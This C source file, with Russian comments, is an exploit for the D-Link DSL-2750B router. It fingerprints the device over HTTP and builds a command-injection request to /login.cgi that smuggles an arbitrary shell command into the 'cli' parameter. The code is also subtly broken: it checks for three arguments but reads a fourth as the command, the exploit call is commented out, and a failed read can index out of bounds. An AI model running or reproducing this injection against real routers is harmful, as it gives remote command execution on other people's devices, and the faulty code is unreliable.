// "D-Link DSL-2750B

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <regex.h>

#define BUFFER_SIZE 4096

// Функция для отправки HTTP-запроса
int http_request(const char *target_ip, int port, const char *path) {
    int sock;
    struct sockaddr_in server_addr;
    char request[BUFFER_SIZE];
    char response[BUFFER_SIZE];
    int bytes_received;

    // Создание сокета
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket creation failed");
        return -1;
    }

    // Настройка адреса сервера
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    // Подключение к серверу
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return -1;
    }

    // Формирование HTTP GET-запроса
    snprintf(request, sizeof(request),
             "GET %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Connection: close\r\n"
             "\r\n", path, target_ip);

    // Отправка запроса
    send(sock, request, strlen(request), 0);

    // Чтение ответа
    bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    response[bytes_received] = '\0'; // Завершение строки

    // Закрытие сокета
    close(sock);

    // Проверка на наличие "DSL-2750B" в ответе
    if (strstr(response, "DSL-2750B") != NULL) {
        return 1; // Уязвимо
    }

    return 0; // Не уязвимо
}

// Функция для выполнения команды
void execute_command(const char *target_ip, int port, const char *cmd) {
    char path[BUFFER_SIZE];
    snprintf(path, sizeof(path), "/login.cgi?cli=multilingual show';%s'$", cmd);

    if (http_request(target_ip, port, path) == 1) {
        printf("Command executed: %s\n", cmd);
    } else {
        printf("Failed to execute command.\n");
    }
}

// Основная функция
int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <target_ip> <target_port>\n", argv[0]);
        return 1;
    }

    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    const char *command = argv[3];

    // Проверка уязвимости
    if (http_request(target_ip, target_port, "/ayefeaturesconvert.js") == 1) {
        // Например, execute_command(target_ip, target_port, command);
    }

    return 0;
}
